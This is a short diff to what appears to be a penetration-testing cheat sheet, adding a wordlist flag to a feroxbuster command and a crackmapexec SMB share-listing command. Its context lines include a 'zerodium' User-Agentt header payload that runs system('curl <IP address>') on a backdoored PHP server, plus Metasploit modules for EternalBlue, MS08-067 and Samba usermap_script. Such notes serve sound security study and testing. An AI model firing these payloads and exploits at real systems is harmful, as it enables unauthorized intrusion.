@@ -64,7 +64,7 @@ $ gobuster vhost -w <wordlist> -u <URL>
 $ ffuf -u <URL>/FUZZ -w <wordlist>
 $ curl -I <URL>
 $ curl <URL> -H 'User-Agentt: zerodiumsystem("curl <IP address>");'
-$ feroxbuster -u <URL>
+$ feroxbuster -w <wordlist> -u <URL>
 $ wfuzz -c -w <wordlist> -u http://FUZZ.<domain>
 ```
 
@@ -90,6 +90,7 @@ msf> use exploit/windows/smb/ms17_010_eternalblue
 msf> use exploit/windows/smb/ms08_067_netapi
 msf> use exploit/multi/samba/usermap_script
 $ enum4linux -a <IP address>
+$ crackmapexec smb <IP address> --shares
 ```
 
 - CUPS (port 631)
